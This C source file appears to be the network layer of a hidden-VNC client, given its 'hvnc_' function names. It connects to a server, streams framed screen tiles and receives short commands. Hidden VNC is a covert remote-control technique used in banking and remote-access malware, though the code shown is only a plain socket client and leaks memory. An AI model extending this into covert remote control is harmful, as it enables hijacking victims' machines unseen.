#include <ws2tcpip.h>
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
static SOCKET sock;

int hvnc_sock_init(const char* SERVER_IP, int port){
    WSADATA wsaData;
    struct addrinfo *result = NULL, hints;
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
        return -1;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    char portstr[20] = {0};
    itoa(port, portstr, 10);
    if(getaddrinfo(SERVER_IP, portstr, &hints, &result) != 0)
        goto cleanup;
    sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if(sock == INVALID_SOCKET)
        goto cleanup;
    if(connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR){
        closesocket(sock);
        goto cleanup;
    }
    freeaddrinfo(result);
    return 0;
cleanup:
    WSACleanup();
    return -1;
}

int hvnc_sock_send(const char* data, int len, int x, int y){
    char* dat = calloc(len+16, 1);
    char magic[4] = "DATA";
    memcpy(dat, magic, 4);
    memcpy(dat+4, &len, 4);
    memcpy(dat+8, &x, 4);
    memcpy(dat+12, &y, 4);
    memcpy(dat+16, data, len);
    if(send(sock, dat, len+16, 0) == SOCKET_ERROR) goto err;
    return 0;
err:
    closesocket(sock);
    return -1;
}

char* hvnc_sock_recv(){
    char* dat = calloc(9, 1);
    if(recv(sock, dat, 9, MSG_WAITALL) <= 0){
        free(dat);
        closesocket(sock);
        return NULL;
    }
    return dat;
}